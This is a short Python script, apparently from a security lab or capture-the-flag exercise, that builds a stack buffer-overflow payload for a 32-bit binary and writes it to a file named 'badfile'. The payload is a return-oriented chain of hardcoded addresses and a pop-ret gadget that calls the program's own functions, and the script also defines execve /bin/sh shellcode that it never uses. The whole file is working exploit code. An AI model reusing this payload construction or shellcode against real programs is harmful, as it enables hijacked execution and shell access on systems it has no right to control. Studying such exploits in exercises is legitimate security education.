import struct

diff_p_ret = 28
addr_free_memory = 0x804855b
addr_check_password = 0x8048622
# "x/nfu secret" oppure "p secret" dopo averlo riempito con build_secret
addr_secret = 0x804b410
addr_exit = 0x8048420

diff_input_ret = 112

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

addr_exevec = 0xb7e3fb40

pop3_ret = 0x0804861e


atk_vector = 'A' * diff_p_ret
atk_vector += struct.pack("I", addr_free_memory)

#gadget
pop_ret = 0x08048620

atk_vector += struct.pack("I", pop_ret)
atk_vector += struct.pack("I", addr_secret)
atk_vector += struct.pack("I", addr_check_password)

atk_vector += struct.pack("I", pop_ret)
atk_vector += struct.pack("I", addr_secret)
atk_vector += struct.pack("I", addr_exit)


f = open("badfile", "w+")
f.write(atk_vector)
f.close()

#print atk_vector



